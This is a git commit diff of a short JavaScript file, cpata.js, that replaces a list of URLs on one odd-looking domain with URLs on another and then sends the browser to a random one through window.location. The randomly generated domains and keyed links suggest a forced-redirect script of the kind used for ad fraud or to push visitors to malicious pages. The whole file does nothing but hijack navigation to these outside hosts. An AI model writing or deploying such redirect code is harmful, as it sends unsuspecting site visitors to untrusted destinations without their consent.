500bfc34d5045a6fe2116e0e92b2eead54eb6cbe
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-09-21 08:13:11 +0800

    Update cpata.js

--- cpata.js
+++ cpata.js
@@ -1,9 +1,11 @@
 var dataUrl = [
-'//wonderfullytumultbizarre.com/vxqhu00qt?key=8b7db070bef4e6586092ffbbf28a9def',
-'//wonderfullytumultbizarre.com/qqqysyvbg?key=1d3303b4d7decb61514e9d25a740edfe',
-'//wonderfullytumultbizarre.com/h9wh6gqgf?key=83df023c116b0886f39e57dbd5e916f1',
-'//wonderfullytumultbizarre.com/ciwpm0hb7q?key=7f0434e3ed63cbba143ee2860b19fd5a',
-'//wonderfullytumultbizarre.com/tuf9tdkp?key=6729f99d594d33885cec1eb3981e92ac'
+'//wavermerchandiseweird.com/ciwpm0hb7q?key=7f0434e3ed63cbba143ee2860b19fd5a',
+'//wavermerchandiseweird.com/ezuq8wdg?key=abe65c5f1fac7c85a5e79772f3e4b4ab',
+'//wavermerchandiseweird.com/h9wh6gqgf?key=83df023c116b0886f39e57dbd5e916f1',
+'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
+'//wavermerchandiseweird.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e',
+'//wavermerchandiseweird.com/k78nwxfv?key=e668079d92f5c385e97d9e9f30beedd3',
+'//wavermerchandiseweird.com/mcq9dwrp?key=26877099e93b852a73d06043b22429bd'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
